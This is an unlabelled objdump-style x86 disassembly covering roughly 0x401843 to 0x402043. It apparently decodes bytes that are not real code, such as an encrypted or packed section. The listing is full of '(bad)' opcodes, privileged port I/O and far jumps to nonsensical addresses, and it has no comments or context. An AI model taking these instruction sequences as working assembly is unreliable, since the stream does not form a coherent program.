  401843:	adc    bh,BYTE PTR [esi+0x59dcc704]
  401849:	ja     0x4017dd
  40184b:	sub    dh,BYTE PTR [edi]
  40184d:	mov    edx,0x71e5554e
  401852:	mov    edi,0x25c28672
  401857:	vmread DWORD PTR [eax-0x3b],ebx
  40185b:	sub    al,BYTE PTR cs:[edi+0x76]
  40185f:	or     al,0xe5
  401861:	pop    ecx
  401862:	mov    ds:0x31aeeb20,eax
  401867:	cmp    bh,BYTE PTR [edx]
  401869:	mov    ds:0xd83366db,al
  40186e:	call   0x5955:0xfcdc7d40
  401875:	mov    edx,0xcfb16483
  40187a:	fistp  QWORD PTR [eax+0x1824c366]
  401880:	fs out dx,al
  401882:	xor    BYTE PTR [esi+0x26],ah
  401885:	inc    edx
  401886:	lods   al,BYTE PTR ds:[esi]
  401887:	lock xor eax,0x6097ea9a
  40188d:	fdiv   QWORD PTR [eax+0x36]
  401890:	shr    ebx,0xf6
  401893:	jecxz  0x4018f6
  401895:	and    eax,0xc82a0e4e
  40189a:	gs pop edx
  40189c:	lds    esi,FWORD PTR [edi+0x6d]
  40189f:	fcmovnbe st,st(4)
  4018a1:	neg    DWORD PTR gs:[ebx+0x68]
  4018a5:	adc    DWORD PTR [esi-0x3b],ebp
  4018a8:	jmp    0x4018ba
  4018aa:	adc    bh,BYTE PTR [esi+0x7247f66f]
  4018b0:	cdq    
  4018b1:	mov    eax,0x8e080cfb
  4018b6:	hlt    
  4018b7:	ret    0x2781
  4018ba:	jae    0x4018fc
  4018bc:	jb     0x401898
  4018be:	in     eax,dx
  4018bf:	jne    0x401866
  4018c1:	pop    esp
  4018c2:	pop    esp
  4018c3:	jmp    0x6564:0x5ce27b10
  4018ca:	push   0x7a
  4018cc:	cmp    cl,BYTE PTR [edx-0x7578188a]
  4018d2:	mov    bh,0x22
  4018d4:	call   0xe01a6eb4
  4018d9:	inc    edi
  4018da:	sbb    DWORD PTR [ecx+0x9550f44],ecx
  4018e0:	fnstsw WORD PTR [edi+ebp*2-0x10]
  4018e4:	lods   al,BYTE PTR ds:[esi]
  4018e5:	out    dx,al
  4018e6:	imul   BYTE PTR [edi+0x412fe6f7]
  4018ec:	aaa    
  4018ed:	xrelease mov DWORD PTR [esp+ebx*8],edi
  4018f1:	dec    ebx
  4018f2:	outs   dx,BYTE PTR ds:[esi]
  4018f3:	clc    
  4018f4:	dec    ebx
  4018f5:	fwait
  4018f6:	push   edx
  4018f7:	repnz dec esi
  4018f9:	sub    al,0x66
  4018fb:	popa   
  4018fc:	adc    edi,DWORD PTR [ecx]
  4018fe:	mov    cs,edi
  401900:	jmp    0xe4e7a17a
  401905:	data16 jmp 0x4018e3
  401908:	xchg   ecx,eax
  401909:	pop    ss
  40190a:	adc    eax,DWORD PTR [ebp-0x75d63fc]
  401910:	int3   
  401911:	mov    DWORD PTR [eax+0x69],edi
  401914:	mov    al,ds:0x88f00f83
  401919:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40191a:	sbb    DWORD PTR [esi+ecx*8],ecx
  40191d:	popa   
  40191e:	mov    ecx,0xfcb998
  401923:	je     0x4018e3
  401925:	and    BYTE PTR [edi+eax*8],ah
  401928:	mov    dh,BYTE PTR [ebp-0x725736d9]
  40192e:	pushf  
  40192f:	imul   edx,DWORD PTR [edx],0x7a
  401932:	xchg   ebx,eax
  401933:	ror    ecx,1
  401935:	pusha  
  401936:	dec    edi
  401937:	adc    DWORD PTR [ebx],ebx
  401939:	sti    
  40193a:	scas   al,BYTE PTR es:[edi]
  40193b:	je     0x40196e
  40193d:	in     eax,0x23
  40193f:	out    dx,eax
  401940:	pop    es
  401941:	lea    ebx,[edi-0xb]
  401944:	pop    esp
  401945:	jmp    0x944a98b6
  40194a:	fidivr DWORD PTR [esi+ebp*4+0x4951dff5]
  401951:	push   0x6f887568
  401956:	ja     0x4018e6
  401958:	repnz xor al,0xe5
  40195b:	cmp    BYTE PTR [edx],0x92
  40195e:	cmc    
  40195f:	mov    BYTE PTR ds:0x926015bc,ah
  401965:	test   DWORD PTR [ecx-0x33],0x92160a4b
  40196c:	in     al,0xfe
  40196e:	pop    ebx
  40196f:	sahf   
  401970:	or     cl,BYTE PTR [ecx+0x42]
  401973:	or     eax,0x84a92b4f
  401978:	mov    ds:0xb750562c,al
  40197d:	push   ebp
  40197e:	loop   0x4019c0
  401980:	ins    BYTE PTR es:[edi],dx
  401981:	pop    ebx
  401982:	mov    cl,0x3d
  401984:	ins    BYTE PTR es:[edi],dx
  401985:	push   ss
  401986:	ja     0x401a07
  401988:	ror    BYTE PTR [ecx],0xe1
  40198b:	std    
  40198c:	faddp  st(4),st
  40198e:	xchg   eax,esp
  401990:	(bad)  
  401991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401992:	inc    ecx
  401993:	pop    ebp
  401994:	pop    esp
  401995:	loopne 0x401a0d
  401997:	mov    ecx,0xd589b5cf
  40199c:	pop    es
  40199d:	iret   
  40199e:	inc    ebx
  40199f:	xor    DWORD PTR [ecx+0xabd9153],eax
  4019a5:	or     al,0x1
  4019a7:	aam    0x46
  4019a9:	mov    DWORD PTR [ebx-0x17],ebp
  4019ac:	push   ds
  4019ad:	add    dh,BYTE PTR [ecx+edi*1+0xf]
  4019b1:	aas    
  4019b2:	nop
  4019b3:	les    edx,FWORD PTR [edx+esi*1]
  4019b6:	mov    ds:0x17662fe8,eax
  4019bb:	nop
  4019bc:	ja     0x4019de
  4019be:	jmp    FWORD PTR [esp+eiz*2+0xd]
  4019c2:	mov    ecx,edx
  4019c4:	ror    bl,cl
  4019c6:	pusha  
  4019c7:	pop    eax
  4019c8:	repnz loopne 0x4019dc
  4019cb:	retf   0xa35f
  4019ce:	icebp  
  4019cf:	push   ds
  4019d0:	enter  0x5708,0xbd
  4019d4:	imul   edi,DWORD PTR [eax],0xa74f307b
  4019da:	shl    BYTE PTR [edi-0x10f392d2],1
  4019e0:	push   ebx
  4019e1:	cmp    al,BYTE PTR [esi+0x52]
  4019e4:	test   DWORD PTR [edx],0x5ba1e03c
  4019ea:	sub    al,0xbd
  4019ec:	xchg   BYTE PTR [esi+0x7],dl
  4019ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019f0:	push   ebp
  4019f1:	scas   al,BYTE PTR es:[edi]
  4019f2:	jno    0x401a49
  4019f4:	shl    bl,1
  4019f6:	cmp    BYTE PTR [eax+eax*8+0x3b77e31e],dh
  4019fd:	mov    eax,DWORD PTR [ecx]
  4019ff:	push   es
  401a00:	loopne 0x401a63
  401a02:	sbb    al,0xaa
  401a04:	mov    bl,0x22
  401a06:	int    0x34
  401a08:	and    esp,DWORD PTR [edi-0x4b]
  401a0b:	mov    BYTE PTR [edx-0x13],dl
  401a0e:	cmp    esi,DWORD PTR [edi+0x3f]
  401a11:	dec    DWORD PTR [ebp-0x59647d27]
  401a17:	sub    al,0xd8
  401a19:	mov    esi,0x9e84ece1
  401a1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a1f:	test   dl,dh
  401a21:	pop    ds
  401a22:	aaa    
  401a23:	das    
  401a24:	mov    ch,BYTE PTR [ecx+0x4ebfae9f]
  401a2a:	jg     0x401a04
  401a2c:	xor    eax,0x8b457553
  401a31:	(bad)  
  401a32:	jno    0x4019c9
  401a34:	xor    al,0xba
  401a36:	add    BYTE PTR [edi+0x64228b65],al
  401a3c:	or     bh,BYTE PTR [esi]
  401a3e:	pop    ss
  401a3f:	jg     0x4019eb
  401a41:	push   es
  401a42:	pushf  
  401a43:	mov    eax,ds:0xab2c7736
  401a48:	rcl    DWORD PTR [ebx-0x1],1
  401a4b:	cmc    
  401a4c:	loop   0x401ab6
  401a4e:	int    0xe2
  401a50:	pushf  
  401a51:	rol    BYTE PTR [ecx+0x68934244],0x6e
  401a58:	inc    eax
  401a59:	jae    0x401a68
  401a5b:	(bad)  
  401a5c:	pop    ebx
  401a5d:	sahf   
  401a5e:	fstp   QWORD PTR [ebx+0x6612cd3]
  401a64:	inc    ebp
  401a65:	fs das 
  401a67:	nop
  401a68:	mov    al,ds:0x44392244
  401a6d:	mov    ds:0x29505ece,eax
  401a72:	inc    edi
  401a73:	call   0xfe6e:0xa0612e21
  401a7a:	inc    esi
  401a7b:	out    dx,al
  401a7c:	xchg   ecx,eax
  401a7d:	mov    ebx,cs
  401a7f:	cwde   
  401a80:	test   DWORD PTR [esi+0x45],ebx
  401a83:	dec    esp
  401a84:	div    BYTE PTR [ebx+0x3f2d4651]
  401a8a:	xchg   esp,eax
  401a8b:	mov    edx,0x4dd3dfac
  401a90:	leave  
  401a91:	mov    esi,0xfa233535
  401a96:	jg     0x401a2a
  401a98:	in     al,dx
  401a99:	pushf  
  401a9a:	xor    DWORD PTR es:[esi+0xb8e07af],edi
  401aa1:	fmul   DWORD PTR [ebx]
  401aa3:	push   es
  401aa4:	lea    esp,[eax+0x43]
  401aa7:	push   0xa
  401aa9:	mov    bl,al
  401aab:	shl    BYTE PTR [esi+0x23],cl
  401aae:	jns    0x401a4c
  401ab0:	int    0x25
  401ab2:	int3   
  401ab3:	ret    0xd78
  401ab6:	mul    DWORD PTR [eax+0x64354d99]
  401abc:	pop    esp
  401abd:	mov    eax,ss
  401abf:	mov    bh,0xa3
  401ac1:	ins    BYTE PTR es:[edi],dx
  401ac2:	xor    al,0x2b
  401ac4:	call   0xa6c14145
  401ac9:	test   DWORD PTR [edi-0x18cccddb],ebx
  401acf:	xor    cl,BYTE PTR [esi]
  401ad1:	fsubr  st,st(0)
  401ad3:	cmp    al,0x18
  401ad5:	out    dx,eax
  401ad6:	cmp    al,0xa
  401ad8:	push   eax
  401ad9:	inc    ebp
  401ada:	dec    edi
  401adb:	cmp    bl,0xbb
  401ade:	sbb    BYTE PTR [eax-0x4f09d558],dh
  401ae4:	jnp    0x401b56
  401ae6:	and    ah,BYTE PTR [ecx-0x3d]
  401ae9:	lahf   
  401aea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401aeb:	push   ss
  401aec:	xchg   ecx,eax
  401aed:	mov    al,0x62
  401aef:	mov    dh,0xee
  401af1:	fcomip st,st(1)
  401af3:	push   0xffffffd5
  401af5:	mov    DWORD PTR [edi-0x3],esp
  401af8:	clc    
  401af9:	out    dx,al
  401afa:	not    DWORD PTR [edx]
  401afc:	jmp    0x7dc170f9
  401b01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b02:	cmp    eax,0xffc6c33b
  401b07:	lods   al,BYTE PTR ds:[esi]
  401b08:	xchg   ebx,eax
  401b09:	pop    edi
  401b0a:	aaa    
  401b0b:	test   dh,ah
  401b0d:	jo     0x401b5d
  401b0f:	dec    ebx
  401b10:	jl     0x401b02
  401b12:	jbe    0x401ae7
  401b14:	iret   
  401b15:	psllw  mm3,QWORD PTR [esi]
  401b18:	arpl   WORD PTR [esi-0x54a2aa02],si
  401b1e:	popa   
  401b1f:	js     0x401b65
  401b21:	dec    esp
  401b22:	inc    edi
  401b23:	sbb    al,0xe7
  401b25:	mov    esp,0x9c6e3872
  401b2a:	xchg   edx,eax
  401b2b:	shr    esp,cl
  401b2d:	rcl    DWORD PTR [edx+0xa],cl
  401b30:	test   BYTE PTR [ecx+0x5bf57d1e],0x85
  401b37:	mov    al,ds:0xda7e4696
  401b3c:	call   0xefca:0x516c6647
  401b43:	and    ebx,DWORD PTR [edi-0x1bd62616]
  401b49:	cmp    al,0x92
  401b4b:	adc    BYTE PTR [esi+eax*2-0x42],bh
  401b4f:	shl    BYTE PTR [ebp-0x5f],cl
  401b52:	cwde   
  401b53:	add    DWORD PTR [esp+ebx*8],0x7082c26a
  401b5a:	mov    eax,ebx
  401b5c:	xchg   ebp,eax
  401b5d:	mov    BYTE PTR [eax+edi*1-0x6a34ef23],al
  401b64:	mov    ds:0x986e0a86,eax
  401b69:	pop    esi
  401b6a:	les    edi,FWORD PTR [esi+esi*8+0x3130d88c]
  401b71:	adc    esp,DWORD PTR [ebx]
  401b73:	and    eax,0x40a18efc
  401b78:	jbe    0x401b06
  401b7a:	clc    
  401b7b:	mov    eax,ds:0x39036b2d
  401b80:	or     DWORD PTR [ebp+0x79],eax
  401b83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b84:	dec    eax
  401b85:	test   eax,0x668f36cf
  401b8a:	outs   dx,BYTE PTR ds:[esi]
  401b8b:	out    0x76,al
  401b8d:	popa   
  401b8e:	in     eax,0x10
  401b90:	pop    esi
  401b91:	push   cs
  401b92:	mov    ds:0x8d89296b,al
  401b97:	pop    ebx
  401b98:	enter  0x8c1e,0x2c
  401b9c:	xchg   DWORD PTR [edi+eax*1+0x62],esi
  401ba0:	cld    
  401ba1:	cmc    
  401ba2:	call   0x8ca6:0x73e57472
  401ba9:	cmp    eax,0xb8e49e85
  401bae:	sub    esi,ecx
  401bb0:	dec    edi
  401bb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bb2:	pop    edi
  401bb3:	int3   
  401bb4:	(bad)  
  401bb5:	jbe    0x401b45
  401bb7:	push   ebx
  401bb8:	and    al,0x3e
  401bba:	mov    eax,ds:0xec7a4417
  401bbf:	dec    esp
  401bc0:	das    
  401bc1:	mov    BYTE PTR [esi],dl
  401bc3:	jecxz  0x401b72
  401bc5:	js     0x401b97
  401bc7:	xlat   BYTE PTR ds:[ebx]
  401bc8:	jecxz  0x401bc6
  401bca:	jmp    esi
  401bcc:	mov    gs,esp
  401bce:	ficom  DWORD PTR [ebx+edi*8-0x37]
  401bd2:	sub    eax,0x4b9a6fb8
  401bd7:	in     al,dx
  401bd8:	out    dx,al
  401bd9:	cld    
  401bda:	jae    0x401c47
  401bdc:	pop    ds
  401bdd:	mov    eax,DWORD PTR [edx-0x2c06593a]
  401be3:	xchg   esi,eax
  401be4:	addr16 pop esi
  401be6:	shl    BYTE PTR [ebx-0x57],0xf7
  401bea:	pop    edx
  401beb:	pop    ds
  401bec:	test   eax,0x9abf443f
  401bf1:	pop    esp
  401bf2:	(bad)  
  401bf3:	clc    
  401bf4:	aaa    
  401bf5:	sub    BYTE PTR [esi+ebx*8+0x14],ch
  401bf9:	sbb    al,0xe1
  401bfb:	in     eax,dx
  401bfc:	rcl    DWORD PTR [eax-0x70],cl
  401bff:	imul   esi,DWORD PTR [esi+0x4e],0x9398ef95
  401c06:	sbb    DWORD PTR [ebp+0x22f3bace],ebx
  401c0c:	ins    BYTE PTR es:[edi],dx
  401c0d:	cmp    esi,DWORD PTR [ebx]
  401c0f:	xor    eax,0x7def6cd
  401c14:	(bad)  
  401c15:	push   ss
  401c16:	das    
  401c17:	test   BYTE PTR [eax+0x4dd2408d],ah
  401c1d:	push   eax
  401c1f:	sub    edi,esp
  401c21:	jne    0x401c9c
  401c23:	jecxz  0x401bb5
  401c25:	cmp    bl,BYTE PTR [edx+ecx*4+0x55]
  401c29:	push   ds
  401c2a:	bound  ebx,QWORD PTR [ebx-0x146dc2d1]
  401c30:	dec    esp
  401c31:	pusha  
  401c32:	cdq    
  401c33:	push   ebx
  401c34:	popa   
  401c35:	in     al,dx
  401c36:	mov    bh,0xe6
  401c38:	rol    DWORD PTR [edx-0x71],0x54
  401c3c:	or     DWORD PTR [ebx+0x4b],0xf52c4dc3
  401c43:	cli    
  401c44:	js     0x401c27
  401c46:	cmp    al,0x33
  401c48:	test   BYTE PTR [ebx+0x13],bl
  401c4b:	and    bl,BYTE PTR ds:0xb3c1809
  401c51:	in     eax,0xec
  401c53:	loope  0x401cca
  401c55:	mov    ds:0xd3b96327,eax
  401c5a:	aaa    
  401c5b:	xor    edi,DWORD PTR [esi+0x22]
  401c5e:	xor    eax,ecx
  401c60:	xchg   esp,eax
  401c61:	stos   BYTE PTR es:[edi],al
  401c62:	mov    eax,ds:0xdd3a5936
  401c67:	or     dl,0x7b
  401c6a:	jp     0x401c75
  401c6c:	mov    ebx,0xb1faac87
  401c71:	jno    0x401c44
  401c73:	xor    al,0xb9
  401c75:	gs gs stos WORD PTR es:[edi],ax
  401c79:	sti    
  401c7a:	cs cs mov esp,0x57d2951f
  401c81:	push   ecx
  401c82:	(bad)  
  401c84:	sbb    dh,dh
  401c86:	fisub  WORD PTR [ebx+esi*1+0x3eac5c8b]
  401c8d:	mov    esi,0x177c0bd
  401c92:	and    ah,dh
  401c94:	addr16 mov esp,0xc1973bcd
  401c9a:	ror    BYTE PTR [ebp-0x55ed194c],1
  401ca0:	arpl   WORD PTR [ebp-0x4168aa1],cx
  401ca6:	jno    0x401c34
  401ca8:	mov    esi,0x18f43af8
  401cad:	adc    DWORD PTR [ecx+ecx*1+0x51912609],ecx
  401cb4:	or     ebp,DWORD PTR [ebx-0x1c05d5fa]
  401cba:	jns    0x401c4e
  401cbc:	fisub  WORD PTR [ebx-0x7eaa1fd9]
  401cc2:	mov    ecx,0x41429a7e
  401cc7:	jb     0x401c93
  401cc9:	jb     0x401d22
  401ccb:	sub    DWORD PTR [edi+0x1315daf],0x4d
  401cd2:	push   ecx
  401cd3:	mov    ebx,0x291b5600
  401cd8:	fisub  WORD PTR [ebx+esi*8-0x58]
  401cdc:	aad    0x6
  401cde:	sub    BYTE PTR [ebx-0x4598c8fe],0x60
  401ce5:	les    ebx,FWORD PTR [eax-0x23a8c5e7]
  401ceb:	call   0xa4df:0x3831ee96
  401cf2:	das    
  401cf3:	repnz pop edi
  401cf5:	jmp    0xb54f44e9
  401cfa:	dec    esi
  401cfb:	inc    ebp
  401cfc:	sub    eax,0x79c09c7e
  401d01:	ret    0x1a48
  401d04:	fs add eax,0x4895557a
  401d0a:	jl     0x401d75
  401d0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d0d:	dec    esp
  401d0e:	clc    
  401d0f:	dec    eax
  401d10:	cmp    eax,0xba1d5f3
  401d15:	mov    dh,0x2c
  401d17:	cwde   
  401d18:	mov    al,ds:0xf1d47180
  401d1d:	xchg   edi,eax
  401d1e:	add    esp,0xffffffa3
  401d21:	int    0x3
  401d23:	cmp    eax,0xe035a6b4
  401d28:	fild   DWORD PTR [ebp+0x574e2766]
  401d2e:	lock into 
  401d30:	xchg   ecx,eax
  401d31:	xor    al,0x4a
  401d33:	jecxz  0x401d2b
  401d35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d36:	and    dh,BYTE PTR [ecx]
  401d38:	popa   
  401d39:	adc    eax,0xb2597e26
  401d3e:	js     0x401d7f
  401d40:	pop    DWORD PTR [esi+0x39939731]
  401d46:	ins    DWORD PTR es:[edi],dx
  401d47:	inc    ebp
  401d48:	sub    BYTE PTR [edx],dl
  401d4a:	sub    DWORD PTR [edi-0x33],edx
  401d4d:	bound  ebx,QWORD PTR [esi]
  401d4f:	push   0xd9c1e748
  401d54:	cld    
  401d55:	cdq    
  401d56:	mov    ch,BYTE PTR [edx-0x668e1c7d]
  401d5c:	addr16 daa 
  401d5e:	sbb    ebx,DWORD PTR [ebx+0x4b268525]
  401d64:	lds    edx,FWORD PTR [eax+0x3a]
  401d67:	mov    eax,0x793d7ec8
  401d6c:	retf   0x61eb
  401d6f:	lods   al,BYTE PTR ds:[esi]
  401d70:	mov    ds:0xa81e4508,eax
  401d75:	addr16 cwde 
  401d77:	mov    ebp,0x1beb8a59
  401d7c:	or     eax,0xe2639f1f
  401d81:	mov    BYTE PTR [edx+0x3d6bf601],ch
  401d87:	(bad)  
  401d88:	clc    
  401d89:	call   0xcb8614ae
  401d8e:	ret    0x5a7d
  401d91:	xlat   BYTE PTR ds:[ebx]
  401d92:	cld    
  401d93:	push   ebx
  401d94:	das    
  401d95:	mov    ds:0x50e5197e,eax
  401d9a:	add    DWORD PTR [esi+0x42],esi
  401d9d:	(bad)  
  401d9e:	imul   eax,DWORD PTR [ebp-0x53975401],0x34
  401da5:	push   esp
  401da6:	retf   
  401da7:	lock out dx,eax
  401da9:	test   DWORD PTR [edi+ebx*4],eax
  401dac:	jae    0x401d7f
  401dae:	sub    BYTE PTR [eax],0x7
  401db1:	aad    0x7d
  401db3:	mov    BYTE PTR es:[edi-0x59],dl
  401db7:	loop   0x401dc4
  401db9:	pop    ecx
  401dba:	jbe    0x401df5
  401dbc:	sti    
  401dbd:	pop    edi
  401dbe:	mov    eax,0xd872cad1
  401dc3:	mov    esp,0xf849851
  401dc8:	add    esp,ebx
  401dca:	sub    BYTE PTR [eax-0x41],bh
  401dcd:	cld    
  401dce:	xchg   ch,dh
  401dd0:	jb     0x401e3c
  401dd2:	dec    edx
  401dd3:	call   0x51de:0x21c033ad
  401dda:	int3   
  401ddb:	sub    al,0xd7
  401ddd:	adc    BYTE PTR [ebp+ebp*2+0x58],ah
  401de1:	test   edx,edi
  401de3:	icebp  
  401de4:	dec    edx
  401de5:	sahf   
  401de6:	adc    dl,cl
  401de8:	or     bl,0x44
  401deb:	dec    esi
  401dec:	setp   BYTE PTR [edi+0x7e]
  401df0:	or     esp,DWORD PTR cs:[eax]
  401df3:	ins    BYTE PTR es:[edi],dx
  401df4:	mov    dl,0x36
  401df6:	cmc    
  401df7:	adc    bl,BYTE PTR [ecx]
  401df9:	inc    esi
  401dfa:	push   esp
  401dfb:	imul   ecx,DWORD PTR [ecx],0xffffffcb
  401dfe:	xchg   esi,ebx
  401e00:	std    
  401e01:	pop    ss
  401e02:	jp     0x401dbe
  401e04:	xchg   ecx,eax
  401e05:	cmp    esp,esp
  401e07:	push   edi
  401e08:	in     al,dx
  401e09:	adc    eax,0x85d26031
  401e0e:	push   edi
  401e0f:	jmp    0x401e2b
  401e11:	stos   DWORD PTR es:[edi],eax
  401e12:	push   0xffffff93
  401e14:	sbb    dh,BYTE PTR [eax]
  401e16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e17:	jne    0x401da9
  401e19:	sub    DWORD PTR [ecx-0x5e1e7d05],0xc
  401e20:	stc    
  401e21:	gs scas eax,DWORD PTR es:[edi]
  401e23:	dec    esi
  401e24:	scas   al,BYTE PTR es:[edi]
  401e25:	add    DWORD PTR [edi+0x77ca4cce],esp
  401e2b:	out    dx,eax
  401e2c:	imul   ecx,DWORD PTR [edx],0xffffffad
  401e2f:	sbb    BYTE PTR [ebp-0x192a232b],al
  401e35:	push   ebx
  401e36:	rcr    DWORD PTR [eax],1
  401e38:	jmp    0xc45d:0x3a077ef5
  401e3f:	lahf   
  401e40:	inc    eax
  401e41:	sbb    al,cl
  401e43:	scas   al,BYTE PTR es:[edi]
  401e44:	add    ah,al
  401e46:	ins    BYTE PTR es:[edi],dx
  401e47:	inc    esi
  401e48:	mov    dl,BYTE PTR [eax]
  401e4a:	sbb    DWORD PTR [ebx],esi
  401e4c:	xchg   esi,eax
  401e4d:	jae    0x401e14
  401e4f:	(bad)  
  401e50:	in     al,dx
  401e51:	sbb    ch,dh
  401e53:	out    dx,eax
  401e54:	and    BYTE PTR [edx+esi*2+0x6607a581],ch
  401e5b:	or     al,0x60
  401e5d:	mul    BYTE PTR [esi-0x361bf59a]
  401e63:	in     al,dx
  401e64:	fmul   DWORD PTR [ecx]
  401e66:	imul   ecx,DWORD PTR [ebp+0x7505fe6e],0xfffffffc
  401e6d:	ror    DWORD PTR [ebx-0x35],1
  401e70:	push   ebx
  401e71:	cli    
  401e72:	xor    BYTE PTR [ecx-0x5a],bh
  401e75:	jmp    0x6d4bd7c3
  401e7a:	ror    edx,cl
  401e7c:	std    
  401e7d:	cmp    al,0xa8
  401e7f:	add    DWORD PTR [ecx+0x3e5abce5],eax
  401e85:	repz mov ecx,0x138e1f15
  401e8b:	sahf   
  401e8c:	jge    0x401ebb
  401e8e:	rol    ebp,1
  401e90:	js     0x401e43
  401e92:	adc    BYTE PTR [edx+0x2f],cl
  401e95:	(bad)
  401e98:	arpl   ax,di
  401e9a:	xor    DWORD PTR [ecx+0xb],ebx
  401e9d:	xor    al,0xd4
  401e9f:	or     ebp,edi
  401ea1:	jnp    0x401f0e
  401ea3:	pop    edx
  401ea4:	das    
  401ea5:	or     eax,0x5ec1ebcf
  401eaa:	mov    edi,0x7c5b8e58
  401eaf:	cmc    
  401eb0:	repz cld 
  401eb2:	ror    DWORD PTR [edx+eax*1-0x44ed7282],cl
  401eb9:	ins    BYTE PTR es:[edi],dx
  401eba:	inc    eax
  401ebb:	mov    edi,DWORD PTR es:[ebp*2-0x4897eccd]
  401ec3:	test   DWORD PTR [edi],eax
  401ec5:	sti    
  401ec6:	xchg   esi,eax
  401ec7:	(bad)
  401eca:	(bad)  
  401ecb:	mov    edx,0x71c4b614
  401ed0:	inc    edx
  401ed1:	call   0x94a970c2
  401ed6:	bound  esp,QWORD PTR [esi+esi*4+0x70b5e2b8]
  401edd:	sbb    al,0x17
  401edf:	pop    ecx
  401ee0:	fcmovu st,st(4)
  401ee2:	in     al,0x59
  401ee4:	add    al,0xc3
  401ee6:	jnp    0x401e98
  401ee8:	mov    bh,0xa2
  401eea:	btr    DWORD PTR [ebp-0x76a302c8],ebp
  401ef1:	fisubr DWORD PTR [esi-0x2936bb34]
  401ef7:	and    BYTE PTR [edx-0x28],ah
  401efa:	shl    DWORD PTR [esi+ebx*1],0x20
  401efe:	pop    ebp
  401eff:	and    BYTE PTR [eax],bl
  401f01:	pop    eax
  401f02:	mov    al,ds:0x681670bb
  401f07:	pop    es
  401f08:	push   edx
  401f09:	cmp    eax,0x932670e4
  401f0e:	dec    edx
  401f0f:	inc    eax
  401f10:	bound  esp,QWORD PTR [eax+0x68]
  401f13:	mov    ecx,0xfbb40770
  401f18:	jne    0x401f8f
  401f1a:	fwait
  401f1b:	pop    eax
  401f1c:	cmp    BYTE PTR [esi-0x10c8e0f8],al
  401f22:	mov    edx,0xafd5642c
  401f27:	dec    eax
  401f28:	test   bl,ch
  401f2a:	jle    0x401f30
  401f2c:	push   es
  401f2d:	mov    ebx,0xe7d3c2f8
  401f32:	dec    ecx
  401f33:	out    0xa4,eax
  401f35:	mov    WORD PTR [edx-0x7a],es
  401f38:	ror    DWORD PTR [edi+0x6f8d4074],0xca
  401f3f:	aas    
  401f40:	dec    esp
  401f41:	cmp    bh,BYTE PTR [ebx-0x6b281e67]
  401f47:	sub    BYTE PTR [ebp+0x1f],0xf1
  401f4b:	and    dl,BYTE PTR [edx+0x7c]
  401f4e:	test   DWORD PTR ds:0xab039295,0xe34747ee
  401f58:	(bad)  
  401f59:	test   esp,0xa924e4ba
  401f5f:	or     al,0x8
  401f61:	loope  0x401faa
  401f63:	xlat   BYTE PTR ds:[ebx]
  401f64:	int3   
  401f65:	fst    QWORD PTR [esi-0x36721974]
  401f6b:	mov    bh,0x8c
  401f6d:	nop
  401f6e:	and    BYTE PTR [ebx],bl
  401f70:	sbb    BYTE PTR [ebx-0x3efd7231],al
  401f76:	mov    BYTE PTR [edi],dh
  401f78:	ficomp WORD PTR [eax]
  401f7a:	js     0x401f24
  401f7c:	fcom   QWORD PTR [edx]
  401f7e:	add    DWORD PTR [ecx+ecx*1+0x6a28a6f3],esi
  401f85:	neg    BYTE PTR [edx]
  401f87:	xor    eax,0x185888dc
  401f8c:	push   ds
  401f8d:	push   ebx
  401f8e:	xchg   ecx,eax
  401f8f:	scas   eax,DWORD PTR es:[edi]
  401f90:	or     edx,0xffffffa3
  401f93:	push   cs
  401f94:	mov    dh,0x8c
  401f96:	and    ebp,DWORD PTR [esi-0x60ff6fe6]
  401f9c:	xchg   edx,eax
  401f9d:	inc    ebx
  401f9e:	fiadd  WORD PTR [ebx]
  401fa0:	xor    al,BYTE PTR [ebx+0x7c7ceca3]
  401fa6:	js     0x401ff9
  401fa8:	or     al,0x59
  401faa:	cs cmp eax,0x235ffaaf
  401fb0:	out    0x1c,eax
  401fb2:	fdivr  DWORD PTR [eax]
  401fb4:	ret    
  401fb5:	xor    edi,DWORD PTR [esi-0x15dc316b]
  401fbb:	push   ebx
  401fbc:	sbb    al,bl
  401fbe:	and    ch,BYTE PTR [ebx+0x7d]
  401fc1:	inc    edx
  401fc2:	imul   esi,esi,0x3d
  401fc5:	ins    DWORD PTR es:[edi],dx
  401fc6:	(bad)  
  401fc7:	mov    edx,0x73c6928
  401fcc:	pop    ebx
  401fcd:	lea    ebx,[edx]
  401fcf:	mul    DWORD PTR [ebx-0x506449cd]
  401fd5:	and    ch,BYTE PTR cs:[eax]
  401fd8:	int3   
  401fd9:	lock pop es
  401fdb:	push   0x95e2d68a
  401fe0:	aaa    
  401fe1:	aas    
  401fe2:	les    eax,FWORD PTR [ebp-0x53]
  401fe5:	mov    ds:0x4f74b47e,al
  401fea:	dec    esi
  401feb:	jg     0x401ff7
  401fed:	in     eax,0x56
  401fef:	imul   ebx,DWORD PTR [edi],0x75b3c7f9
  401ff5:	push   ds
  401ff6:	popa   
  401ff7:	fld    DWORD PTR ds:0xe65cc463
  401ffd:	mov    ax,0xd590
  402001:	sub    bh,BYTE PTR [ebp-0x63c7fae7]
  402007:	or     DWORD PTR [edx+ebp*1-0x449583cc],esp
  40200e:	pop    edx
  40200f:	sub    ecx,DWORD PTR [eax-0x6a]
  402012:	inc    DWORD PTR [esi-0x26]
  402015:	cs xchg ebx,eax
  402017:	div    DWORD PTR [eax]
  402019:	iret   
  40201a:	ficom  DWORD PTR [edi+edx*1-0x17d0e1ce]
  402021:	out    0xf9,al
  402023:	aaa    
  402024:	pop    ds
  402025:	sbb    eax,0x3de044e9
  40202a:	dec    ebp
  40202b:	daa    
  40202c:	aad    0x53
  40202e:	mov    eax,ds:0x2fdb1bb7
  402033:	lods   al,BYTE PTR ds:[esi]
  402034:	iret   
  402035:	push   ebp
  402036:	push   ss
  402037:	mov    ds:0xb815fcb6,al
  40203c:	inc    edx
  40203d:	fimul  WORD PTR ds:0x4b91e625
  402043:	sbb    BYTE PTR [ecx+0x5c45705c],ch
